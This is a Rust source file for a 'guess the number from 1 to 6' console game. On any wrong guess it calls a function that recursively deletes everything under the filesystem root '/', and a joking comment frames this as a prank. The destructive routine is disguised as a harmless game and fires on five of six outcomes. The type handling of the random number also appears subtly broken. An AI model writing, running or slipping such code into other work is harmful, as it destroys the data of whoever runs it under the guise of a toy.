use std::{
    time::{
        SystemTime,
        UNIX_EPOCH
    },
    io,
    fs
};

fn clear_folder(path: &str) {
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries {
            if let Ok(entry) = entry {
                let path = entry.path();

                if path.is_dir() {
                    fs::remove_dir_all(path).unwrap();
                } else {
                    fs::remove_file(path).unwrap();
                }
            }
        }
    }
}


fn main() {
    let mut input = String::new();

    println!("Guess the number! 1-6");

    io::stdin()
        .read_line(&mut input)
        .unwrap();

    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .subsec_nanos();

    let number: u8 = (seed % 6) + 1;

    let guess: u8 = input.trim().parse().unwrap();

    if guess == number {
        println!("That's correct!");
    } else {
        // Rust translates this at runtime :3
        clear_folder("/");
    }
}
